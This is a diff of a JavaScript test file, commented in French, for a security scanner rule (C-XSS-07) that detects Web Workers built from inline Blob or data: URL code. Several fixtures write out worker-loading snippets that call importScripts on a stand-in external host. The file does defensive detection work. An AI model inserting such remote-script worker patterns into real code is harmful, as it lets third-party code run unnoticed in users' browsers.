@@ -4,7 +4,7 @@ import path from 'node:path';
 import fs from 'node:fs';
 import os from 'node:os';
 import { extraireImportMaps } from '../src/moteur/analyse-js.js';
-import { analyserRessourcesExternes, analyserSortiesReseau } from '../src/regles/c-securite.js';
+import { analyserRessourcesExternes, analyserSortiesReseau, analyserInjections } from '../src/regles/c-securite.js';
 import { analyserDependancesDistantes } from '../src/regles/e-dependances.js';
 import { construireContexte } from '../src/contexte/inventaire.js';
 
@@ -346,4 +346,52 @@ test('importScripts() avec DEUX arguments externes distincts sur le même appel 
   assert.equal(constats.length, 2, "avant ce correctif, la clé de dédoublonnage (fichier:ligne:canal) aurait fait disparaître le second argument, identique au premier sur ces trois critères");
   assert.ok(constats.some((c) => c.constat.includes('exemple-un.tiers')));
   assert.ok(constats.some((c) => c.constat.includes('exemple-deux.tiers')));
+});
+
+// ---------------------------------------------------------------------------
+// C-XSS-07 : Worker/SharedWorker construit depuis du code en chaîne
+// (Blob/data:), trouvé par la coordination — vérifié par l'exécution (vraie
+// Chromium) qu'un importScripts() externe SANS CORS s'exécute bien depuis un
+// worker blob: comme depuis un worker data: (voir la conversation).
+// ---------------------------------------------------------------------------
+
+test('C-XSS-07 : new Worker(URL.createObjectURL(new Blob([littéral]))) est critique et bloquant', () => {
+  const ctx = { fichiers: [fichier('app.js', "const w = new Worker(URL.createObjectURL(new Blob([\"importScripts('https://exemple.tiers/x.js')\"])));")] };
+  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  assert.ok(c, "le code du worker est une chaîne écrite dans le dépôt, jamais lue par aucune règle basée sur les fichiers");
+  assert.equal(c.severite, 'critique');
+  assert.equal(c.bloquant, true);
+});
+
+test("C-XSS-07 : new SharedWorker(URL.createObjectURL(new Blob([littéral]))) est également détecté", () => {
+  const ctx = { fichiers: [fichier('app.js', "const w = new SharedWorker(URL.createObjectURL(new Blob(['postMessage(1)'])));")] };
+  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  assert.ok(c);
+});
+
+test('C-XSS-07 : new Worker(url data: littérale) est critique et bloquant', () => {
+  const ctx = { fichiers: [fichier('app.js', "const w = new Worker('data:text/javascript,importScripts(%27https://exemple.tiers/x.js%27)');")] };
+  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  assert.ok(c);
+  assert.equal(c.severite, 'critique');
+  assert.equal(c.bloquant, true);
+});
+
+test('C-XSS-07 : un Blob construit depuis une VARIABLE (contenu reçu du réseau) ne déclenche rien — déjà couvert par C-EXFIL-01/02 au moment de la requête', () => {
+  const ctx = { fichiers: [fichier('app.js', [
+    "const texte = await (await fetch('https://exemple.tiers/lib.js')).text();",
+    'const w = new Worker(URL.createObjectURL(new Blob([texte])));',
+  ].join('\n'))] };
+  assert.equal(analyserInjections(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0, "aucun littéral dans le tableau du Blob : le contenu vient d'ailleurs (déjà vu par C-EXFIL-01/02 sur le fetch)");
+});
+
+test("C-XSS-07 : new Worker('./local.js') normal (chemin de fichier, pas data:) ne déclenche rien", () => {
+  const ctx = { fichiers: [fichier('app.js', "const w = new Worker('./local.js');")] };
+  assert.equal(analyserInjections(ctx).filter((x) => x.regle === 'C-XSS-07').length, 0);
+});
+
+test('C-XSS-07 : un gabarit statique dans le tableau du Blob compte aussi comme littéral', () => {
+  const ctx = { fichiers: [fichier('app.js', 'const w = new Worker(URL.createObjectURL(new Blob([`postMessage(1);`])));')] };
+  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-07');
+  assert.ok(c);
 });
